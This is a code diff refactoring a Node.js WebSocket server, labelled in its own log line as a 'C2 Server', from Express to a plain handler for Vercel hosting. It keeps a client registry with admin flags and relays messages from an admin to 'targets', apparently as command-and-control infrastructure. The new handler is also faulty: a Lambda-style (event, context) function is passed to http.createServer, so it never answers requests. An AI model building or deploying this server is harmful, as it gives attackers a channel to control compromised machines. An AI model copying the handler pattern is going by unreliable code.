@@ -1,29 +1,27 @@
-const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
+const fs = require('fs');
 const path = require('path');
 
 // --- GLOBAL STATE ---
-let app;
-let server;
-let wss;
 let clients = {}; // { id: { ws, info, isAdmin, lastSeen } }
+let wss;
 
-function initServer() {
-    if (app) return { app, server, wss };
+// Helper to read file safely
+function readFileSafe(filePath) {
+    try {
+        return fs.readFileSync(filePath, 'utf8');
+    } catch (e) {
+        return null;
+    }
+}
 
-    app = express();
-    server = http.createServer(app);
+// Initialize WebSocket Server
+function initWSS(server) {
+    if (wss) return wss;
+
     wss = new WebSocket.Server({ server });
-
-    // Serve static files (admin.html) from the current directory
-    app.use(express.static(path.join(__dirname))); 
-
-    // Health check endpoint
-    app.get('/health', (req, res) => {
-        res.status(200).send('OK');
-    });
 
     wss.on('connection', (ws, req) => {
         const id = uuidv4().substr(0, 8);
@@ -82,7 +80,7 @@ function initServer() {
         });
     });
 
-    return { app, server, wss };
+    return wss;
 }
 
 function notifyAdmin(id, msg) {
@@ -113,44 +111,63 @@ function forwardToTarget(sourceId, data) {
     }
 }
 
-const PORT = process.env.PORT || 3000;
+// Main Request Handler
+const handler = async (event, context) => {
+    const url = event.path || '/';
+    
+    // Serve Static Files Directly to avoid Express overhead/crashes
+    if (url === '/admin.html' || url === '/index.html') {
+        const filePath = path.join(__dirname, url);
+        const content = readFileSafe(filePath);
+        
+        if (content) {
+            return {
+                statusCode: 200,
+                headers: { 'Content-Type': 'text/html; charset=utf-8' },
+                body: content
+            };
+        } else {
+            return {
+                statusCode: 404,
+                body: 'File not found'
+            };
+        }
+    }
+
+    // Health Check
+    if (url === '/health') {
+        return {
+            statusCode: 200,
+            headers: { 'Content-Type': 'text/plain' },
+            body: 'OK'
+        };
+    }
+
+    // Default: Return a simple status or redirect
+    return {
+        statusCode: 200,
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+            status: 'running', 
+            connectedClients: Object.keys(clients).length,
+            timestamp: new Date().toISOString()
+        })
+    };
+};
+
+// Create HTTP Server
+const server = http.createServer(handler);
+
+// Initialize WS
+initWSS(server);
 
 // Local Development Listener
-if (!module.parent) {
+if (!process.env.VERCEL) {
+    const PORT = process.env.PORT || 3000;
     server.listen(PORT, () => {
         console.log(`C2 Server running on port ${PORT}`);
     });
 }
 
 // Vercel Export
-exports.handler = async (event, context) => {
-    const { app, server, wss } = initServer();
-    
-    // Handle HTTP requests
-    return new Promise((resolve) => {
-        // Create a mock response object for Vercel
-        const req = event;
-        const res = {
-            statusCode: 200,
-            headers: {},
-            body: '',
-            end: (body) => {
-                resolve({
-                    statusCode: 200,
-                    headers: { 'Content-Type': 'text/html' },
-                    body: body
-                });
-            },
-            writeHead: (code, headers) => {
-                res.statusCode = code;
-                res.headers = headers;
-            },
-            write: (chunk) => {
-                res.body += chunk;
-            }
-        };
-
-        // Use Express to handle the request
-        app(req, res);
-    });
-};
+exports.handler = handler;
